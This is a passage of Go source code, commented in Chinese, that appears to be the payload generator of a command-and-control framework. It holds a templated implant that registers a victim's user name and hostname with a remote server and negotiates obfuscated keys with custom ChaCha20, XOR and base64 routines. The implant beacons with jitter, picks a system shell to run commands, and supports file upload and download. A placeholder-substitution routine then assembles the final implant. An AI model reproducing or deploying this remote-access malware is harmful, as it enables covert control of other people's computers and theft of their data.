                workingState[diags[i][0]], workingState[diags[i][1]], workingState[diags[i][2]], workingState[diags[i][3]] = a, b, c, d
            }
        }
        var keystream [64]byte
        for i := 0; i < 16; i++ {
            state[i] += workingState[i]
            binary.LittleEndian.PutUint32(keystream[i*4:i*4+4], state[i])
        }
        return keystream
    }
    func xorBytes(a, b []byte) []byte {
        n := len(a)
        if len(b) < n {
            n = len(b)
        }
        result := make([]byte, n)
        for i := 0; i < n; i++ {
            result[i] = a[i] ^ b[i]
        }
        return result
    }
    func ChaCha20Encrypt(plaintext []byte, key [32]byte, nonce [12]byte) []byte {
        if len(plaintext) == 0 {
            return nil
        }
        keystream := make([]byte, 0, len(plaintext))
        counter := uint32(0)
        for pos := 0; pos < len(plaintext); pos += 64 {
            block := chacha20Block(key, counter, nonce)
            blockLen := min(64, len(plaintext)-pos)
            keystream = append(keystream, block[:blockLen]...)
            counter++
        }
        return xorBytes(plaintext, keystream)
    }
    func min(a, b int) int {
        if a < b {
            return a
        }
        return b
    }
    // 加密解密函数
    func EncryptDecrypt(input []byte) []byte {
        if len(input) == 0 {
            return nil
        }
        result := make([]byte, len(input))
        startIndex := 0
        if len(input) < keyPartArr[len(keyPartArr)-1] {
            for i := 0; i < len(keyPartArr); i++ {
                if len(input) <= keyPartArr[i] {
                    if keyPartArr[i] > 0 && len(key) > 0 {
                        startIndex = keyPartArr[i] % len(key)
                        break
                    }
                }
            }
            for i, b := range input {
                key_ := key[(startIndex+i)%len(key)]
                result[i] = b ^ key_
            }
            return result
        }
        startIndex = len(input) % len(key)
        var cha_key [32]byte
        var cha_nonce [12]byte
        for k := 0; k < 32; k++ {
            cha_key[k] = key[(startIndex+k)%len(key)]
        }
        for n := 0; n < 12; n++ {
            cha_nonce[n] = key[(startIndex+32+n)%len(key)]
        }
        return ChaCha20Encrypt(input, cha_key, cha_nonce)
    }
    func get_decry_f(filePath string) ([]byte, error) {
        data,_:= ioutil.ReadFile(filePath)
        decrypted := EncryptDecrypt(data)
        return decrypted, nil
    }
    func get_encry_f(filepath, file_key string) error {
        data,_ := file_byte_parts[file_key]
        defer delete(file_byte_parts, file_key)
        decrypted := EncryptDecrypt(data)
        err := os.WriteFile(filepath, decrypted, 0666)
        if err != nil {
            return err
        }
        return nil
    }
    // 编码函数（无 padding）
    func customBase64Encode(data []byte) string {
        var buf bytes.Buffer
        for i := 0; i < len(data); i += 3 {
            var b [3]byte
            n := copy(b[:], data[i:])
            val := uint32(b[0])<<16 | uint32(b[1])<<8 | uint32(b[2])
            for j := 0; j < n+1; j++ {
                index := (val >> uint(18-6*j)) & 0x3F
                buf.WriteByte(base_rounds[index])
            }
        }
        return buf.String()
    }
    // 解码函数（无 padding）
    func customBase64Decode(s string) ([]byte) {
        var val uint32
        var valb int
        var out []byte
        for i := 0; i < len(s); i++ {
            c := s[i]
            v, ok := decodeMap[c]
            if !ok {
                return nil
            }
            val = (val << 6) | uint32(v)
            valb += 6
            if valb >= 8 {
                valb -= 8
                out = append(out, byte((val>>valb)&0xFF))
            }
        }
        return out
    }
    // 加密字符串
    func get_encry_s(input *string) string {
        encryptedBytes := EncryptDecrypt([]byte(*input))
        return customBase64Encode(encryptedBytes)
    }
    // 解密字符串
    func get_decry_s(input *string) string {
        // Base64 解码
        decodedBytes := customBase64Decode(*input)
        if decodedBytes == nil {
            return ""
        }
        decryptedBytes := EncryptDecrypt(decodedBytes)
        return string(decryptedBytes)
    }
    func buildDecodeMap() map[byte]int {
        m := make(map[byte]int)
        for i := 0; i < len(base_rounds); i++ {
            m[base_rounds[i]] = i
        }
        return m
    }
    func generateUUID() string {
        rand.Seed(time.Now().UnixNano())
        uuid := make([]byte, 6+rand.Intn(7)) // 6 + [0..6]，长度6到12字节
        for i := 0; i < len(uuid); i++ {
            uuid[i] = byte(rand.Intn(256))
        }
        if len(uuid) > 6 {
            uuid[6] = (uuid[6] & 0x0f) | 0x40
        }
        if len(uuid) > 8 {
            uuid[8] = (uuid[8] & 0x3f) | 0x80
        }
        uuidStr := byteSliceToHex(uuid)
        return customBase64Encode([]byte(uuidStr))
    }
    func byteSliceToHex(bytes []byte) string {
        hexChars := "0123456789abcdef"
        result := make([]byte, len(bytes)*2)
        for i, b := range bytes {
            result[i*2] = hexChars[b>>4]
            result[i*2+1] = hexChars[b&0x0f]
        }
        return string(result)
    }
    func decryptString(key string, pavi_key []int) string {
        if key != "null" {
            client_key := []byte(key)
            if len(pavi_key) < 6 {
                return key // 避免越界
            }
            // 均分 client_key 成 6 段
            segmentSize := len(client_key) / 6
            for i := 0; i < 6; i++ {
                start := i * segmentSize
                end := start + segmentSize
                if i == 5 { // 最后一段包含余数
                    end = len(client_key)
                }
                for j := start; j < end; j++ {
                    if client_key[j] < byte(pavi_key[i]) {
                        client_key[j] = client_key[j] ^ byte(pavi_key[i])
                    }
                }
            }
            return string(client_key)
        }
        return "null"
    }
    // 客户端生成并交换密钥，支持 6 个 key
    func generateAndUpdateKey(url, uid string) []int {
        // 先随机生成 6 个初始 key
        key_map := []int{
            rand.Intn(50) + 1, rand.Intn(50) + 1,
            rand.Intn(50) + 1, rand.Intn(50) + 1,
            rand.Intn(50) + 1, rand.Intn(50) + 1,
        }
        base_respBody := getUrl(url)
        decodedBytes := customBase64Decode(base_respBody)
        respBody := string(decodedBytes)
        if respBody == "" {
            return nil
        }
        conn_parts := strings.Split(respBody, "-")
        if len(conn_parts) < 12 { // 服务端应该返回 6+6=12 个数字
            time.Sleep(2 * time.Second)
            run()
        }
        serverpub_key := conn_parts[:6]  // 前 6 个是服务端公钥
        servermid := conn_parts[6:]      // 后 6 个是中间值
        // 计算客户端交换值
        for i := 0; i < len(serverpub_key); i++ {
            serverVal, _ := strconv.Atoi(serverpub_key[i])
            clientVal := key_map[i]
            exchangeVal := serverVal ^ clientVal
            key_map = append(key_map, exchangeVal)
        }
        // 计算最终中间值
        for i := 0; i < len(servermid); i++ {
            serverVal, _ := strconv.Atoi(servermid[i])
            exchangeVal := key_map[i]
            intermediateVal := serverVal ^ exchangeVal
            key_map = append(key_map, intermediateVal)
        }
        // 把客户端中间值 (第 6~11) 传给服务端
        base_key_part := customBase64Encode([]byte(
            strconv.Itoa(key_map[6]) + "-" +
                strconv.Itoa(key_map[7]) + "-" +
                strconv.Itoa(key_map[8]) + "-" +
                strconv.Itoa(key_map[9]) + "-" +
                strconv.Itoa(key_map[10]) + "-" +
                strconv.Itoa(key_map[11]),
        ))
        key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + base_key_part
        getUrl(key_url)
        // 返回最终 6 个 key（第 12~17）
        return []int{
            key_map[12], key_map[13], key_map[14],
            key_map[15], key_map[16], key_map[17],
        }
    }
    func getConn(newKey_map *[]int) {
        key = "null"
        keyPartArr = []int{}
        get_keyUrl := protocol + master + "//*Path*/?/*option*/=/*encry_key*/&/*uid*/=" + uid
        for {
            wait := int(delay)
            if delay > 30 {
                wait += rand.Intn(jitter + 1)
            }
            time.Sleep(time.Duration(wait) * time.Second)
            base_key_str := getUrl(get_keyUrl)
            decode_key_str := customBase64Decode(base_key_str)
            key_str := string(decode_key_str)
            key =  decryptString(key_str,*newKey_map)
            if key !="null"{
                onece = false
                return
            }
        }
    }
    func run() {
        if onece {
            rand.Seed(time.Now().UnixNano())
            executable, _ = os.Executable()
            decodeMap = buildDecodeMap()
            if uid == "" {uid = generateUUID()}
            initHttpClient()
            if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
            clientname = strings.TrimSpace(Command("hostname"))
            post_headers["Host"] = master
            get_headers["Host"] = master
            user_b := customBase64Encode([]byte(user))
            client_b := customBase64Encode([]byte(clientname))
            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*user*/=" + user_b + "&/*hostname*/=" + client_b
            newKey_map:= generateAndUpdateKey(url, uid)
            for {
                getConn(&newKey_map)
                if !onece && key != "null" && len(key) >= 1024 {
                    keyPartArr = append(keyPartArr,
                                        6, 17,int(math.Abs(float64(key[24] - 1))),
                                        int(key[13]),int(key[74]) + 24,
                                        45, 78,int(key[45]) + int(key[67]),
                                        int(key[79]) + int(key[89]) + int(key[106]),128,
                                        int(key[85]) + int(key[94]) + int(key[189]) + int(key[216]),
                                        256, 384,512 + int(key[196]),
                                        int(key[43]) + int(key[443]) + 640,
                                        768 + int(key[569]),len(key) - 25,
                                        int(math.Abs(math.Sin(float64(key[445])) * 128)) * 12,
                                        int(math.Log(float64(key[530])+1) * 255) * 24,
                                        int(math.Pow(float64(key[660]), 1) * 48),
                                        int(math.Sqrt(float64(key[970]))) * 64,
                                        (len(key) + int(key[1024])) * 128,
                                    )
                    send()
                    getCmd()
                } else {
                    continue
                }
            }
        }else{getCmd()}
    }
    `
    // 替换占位符
	replacements := map[string]string{
		`/\*sys_str\*/`:           sys_str,
		`/\*tls_str\*/`:           tls_str,
		`/\*protocol_var\*/`:      protocol_var,
		`/\*os\*/`:                o_os,
		`/\*Username\*/`:          u_username,
		`/\*server\*/`:            s_server,
		`/\*protocol_str\*/`:      protocol_str,
		`/\*main_str\*/`:          main_str,
		`/\*os_str\*/`:            os_str,
		`/\*Path\*/`:              Path,
		`/\*ConnPath\*/`:          ConnPath,
		`/\*MsgPath\*/`:           MsgPath,
        `/\*package_str\*/`:       package_str,
        `/\*switch_key\*/`:        switch_key,
        `/\*encry_key\*/`:         encry_key,
        `/\*download\*/`:          download,
        `/\*result\*/`:            result,
        `/\*_net\*/`:              _net,
        `/\*info\*/`:              info,
        `/\*upload\*/`:            upload,
        `/\*list\*/`:              list,
        `/\*option\*/`:            option,
        `/\*user\*/`:              user,
        `/\*uid\*/`:            uid,
        `/\*hostname\*/`:          hostname,
        `/\*keyPart\*/`:           keyPart,
        `/\*filekey\*/`:           filekey,
        `/\*code\*/`:              code,
        `/\*base_rounds\*/`:      base_rounds,
        `/\*send\*/`:             send,
	}
    //先将code中的关键词进行替换
	processedCode := replacePlaceholders(code, replacements, `/\*code\*/`)
    // 再将 send 字符串中的关键词进行替换
    processedSend := replacePlaceholders(send, replacements, `/\*send\*/`)
    // 更新 replacements 中的 send
    replacements[`/\*send\*/`] = processedSend
    // 最后整体替换模板
    final := applyTemplate(templateStr, processedCode, replacements)
    return final
}

func replacePlaceholders(input string, replacements map[string]string, skipKey string) string {
	for pattern, replacement := range replacements {
		if pattern == skipKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		input = re.ReplaceAllString(input, replacement)
	}
	return input
}

func applyTemplate(templateStr, processedCode string, replacements map[string]string) string {
	const codeKey = `/\*code\*/`
	// 替换其他字段
	for pattern, replacement := range replacements {
		if pattern == codeKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		templateStr = re.ReplaceAllString(templateStr, replacement)
	}
	// 最后替换 code 部分
	re := regexp.MustCompile(codeKey)
	templateStr = re.ReplaceAllString(templateStr, processedCode)

	return templateStr
}
